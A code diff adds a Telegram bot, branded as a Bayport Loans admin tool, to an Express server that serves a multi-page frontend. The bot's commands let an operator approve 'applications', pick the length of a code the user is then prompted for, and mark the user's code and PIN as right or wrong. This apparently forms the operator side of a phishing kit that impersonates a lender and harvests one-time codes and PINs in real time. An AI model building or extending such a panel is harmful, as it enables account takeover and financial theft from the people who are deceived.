@@ -7,10 +7,118 @@ const cors = require('cors');
 const path = require('path');
 const morgan = require('morgan');
 const axios = require('axios');
+const TelegramBot = require('node-telegram-bot-api');  // ADD THIS
 
 // ==================== INIT ====================
 const app = express();
 const PORT = process.env.PORT || 5000;
+
+// ==================== START TELEGRAM BOT ====================
+const botToken = process.env.TELEGRAM_BOT_TOKEN;
+let bot = null;
+
+if (botToken) {
+    try {
+        bot = new TelegramBot(botToken, { polling: true });
+        console.log('🤖 Telegram Bot Started Successfully');
+
+        // /start command
+        bot.onText(/\/start/, (msg) => {
+            const chatId = msg.chat.id;
+            bot.sendMessage(chatId, 
+                '🚀 *Bayport Loans Admin Bot*\n\n' +
+                '*Commands:*\n' +
+                '• `/approve_[ref]` - Approve application\n' +
+                '• `/reject_[ref]` - Reject application\n' +
+                '• `/correct_[ref]` - Mark code as correct\n' +
+                '• `/wrong_[ref]` - Mark code as wrong\n' +
+                '• `/pin_correct_[ref]` - Mark PIN as correct\n' +
+                '• `/pin_wrong_[ref]` - Mark PIN as wrong\n\n' +
+                '*Example:* `/approve_BLABC123`',
+                { parse_mode: 'Markdown' }
+            );
+        });
+
+        // Approve command
+        bot.onText(/\/approve_(.+)/, (msg, match) => {
+            const chatId = msg.chat.id;
+            const refId = match[1];
+            bot.sendMessage(chatId, 
+                `✅ *Application Approved*\n\nReference: ${refId}\n\nSelect code length:`,
+                {
+                    parse_mode: 'Markdown',
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                { text: '4 Digits', callback_data: `code4_${refId}` },
+                                { text: '5 Digits', callback_data: `code5_${refId}` },
+                                { text: '6 Digits', callback_data: `code6_${refId}` }
+                            ]
+                        ]
+                    }
+                }
+            );
+        });
+
+        // Reject command
+        bot.onText(/\/reject_(.+)/, (msg, match) => {
+            const chatId = msg.chat.id;
+            const refId = match[1];
+            bot.sendMessage(chatId, `❌ *Application Rejected*\n\nReference: ${refId}`, { parse_mode: 'Markdown' });
+        });
+
+        // Code correct
+        bot.onText(/\/correct_(.+)/, (msg, match) => {
+            const chatId = msg.chat.id;
+            const refId = match[1];
+            bot.sendMessage(chatId, `✅ *Code Correct*\n\nReference: ${refId}\n\nWaiting for PIN...`, { parse_mode: 'Markdown' });
+        });
+
+        // Code wrong
+        bot.onText(/\/wrong_(.+)/, (msg, match) => {
+            const chatId = msg.chat.id;
+            const refId = match[1];
+            bot.sendMessage(chatId, `❌ *Wrong Code*\n\nReference: ${refId}\n\nUser will try again.`, { parse_mode: 'Markdown' });
+        });
+
+        // PIN correct
+        bot.onText(/\/pin_correct_(.+)/, (msg, match) => {
+            const chatId = msg.chat.id;
+            const refId = match[1];
+            bot.sendMessage(chatId, `✅ *PIN Correct*\n\nReference: ${refId}\n\nApplication Complete!`, { parse_mode: 'Markdown' });
+        });
+
+        // PIN wrong
+        bot.onText(/\/pin_wrong_(.+)/, (msg, match) => {
+            const chatId = msg.chat.id;
+            const refId = match[1];
+            bot.sendMessage(chatId, `❌ *Wrong PIN*\n\nReference: ${refId}\n\nUser will try again.`, { parse_mode: 'Markdown' });
+        });
+
+        // Handle inline keyboard callbacks (code length selection)
+        bot.on('callback_query', async (callbackQuery) => {
+            const msg = callbackQuery.message;
+            const [action, refId] = callbackQuery.data.split('_');
+            
+            let codeLength = '';
+            if (action === 'code4') codeLength = '4-digit';
+            if (action === 'code5') codeLength = '5-digit';
+            if (action === 'code6') codeLength = '6-digit';
+            
+            bot.sendMessage(msg.chat.id, 
+                `✅ *${codeLength} code selected*\n\nReference: ${refId}\n\nThe user will now be prompted for a ${codeLength} code.`,
+                { parse_mode: 'Markdown' }
+            );
+            
+            bot.answerCallbackQuery(callbackQuery.id);
+        });
+
+    } catch (error) {
+        console.log('⚠️ Bot error:', error.message);
+    }
+} else {
+    console.log('⚠️ No bot token provided');
+}
 
 // ==================== MIDDLEWARE ====================
 app.use(cors());
@@ -18,7 +126,6 @@ app.use(express.json());
 app.use(morgan('dev'));
 
 // ==================== STATIC FILES - SERVE FRONTEND ====================
-// Serve all static files from the frontend folder
 app.use(express.static(path.join(__dirname, 'frontend')));
 
 // ==================== API ROUTES ====================
@@ -102,29 +209,24 @@ app.get('/api/get-updates/:offset?', async (req, res) => {
 
 // ==================== FRONTEND ROUTES ====================
 
-// Serve index.html for root
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'frontend/index.html'));
 });
 
-// Serve page2.html
 app.get('/page2', (req, res) => {
     res.sendFile(path.join(__dirname, 'frontend/page2.html'));
 });
 
-// Serve page3.html
 app.get('/page3', (req, res) => {
     res.sendFile(path.join(__dirname, 'frontend/page3.html'));
 });
 
-// Serve success.html
 app.get('/success', (req, res) => {
     res.sendFile(path.join(__dirname, 'frontend/success.html'));
 });
 
 // ==================== ERROR HANDLING ====================
 
-// 404 handler for API routes
 app.use('/api/*', (req, res) => {
     res.status(404).json({ 
         success: false, 
@@ -132,13 +234,11 @@ app.use('/api/*', (req, res) => {
     });
 });
 
-// Error handling middleware
 app.use((err, req, res, next) => {
     console.error('Server Error:', err.stack);
     res.status(500).json({ 
         success: false, 
-        error: 'Internal server error',
-        message: process.env.NODE_ENV === 'development' ? err.message : undefined
+        error: 'Internal server error'
     });
 });
 
@@ -152,7 +252,7 @@ app.listen(PORT, '0.0.0.0', () => {
     ║  📡 Port: ${PORT}                             ║
     ║  🌍 Environment: ${process.env.NODE_ENV || 'development'}        ║
     ║  📁 Frontend: ${path.join(__dirname, 'frontend')}  ║
-    ║  🤖 Telegram: ${process.env.TELEGRAM_BOT_TOKEN ? '✅ Configured' : '❌ Not Configured'}         ║
+    ║  🤖 Telegram Bot: ${bot ? '✅ Running' : '❌ Not Running'}         ║
     ╚════════════════════════════════════════════╝
     `);
 });
